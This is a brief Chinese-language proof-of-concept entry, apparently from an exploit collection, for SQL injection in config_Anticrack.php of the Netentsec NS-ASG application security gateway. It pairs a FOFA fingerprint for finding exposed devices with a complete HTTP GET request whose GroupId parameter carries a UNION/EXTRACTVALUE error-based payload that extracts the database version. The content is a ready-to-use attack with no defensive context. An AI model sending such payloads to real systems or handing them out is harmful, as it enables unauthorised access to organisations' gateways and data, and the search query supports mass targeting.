##  网康科技NS-ASG应用安全网关config_Anticrack.php存在SQL注入漏洞

## fofa
```
app="网康科技-NS-ASG安全网关
```

## poc
```
GET /admin/config_Anticrack.php?GroupId=1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+version()),0x7e)) HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36
Accept-Charset: utf-8
Accept-Encoding: gzip, deflate
Connection: close

```
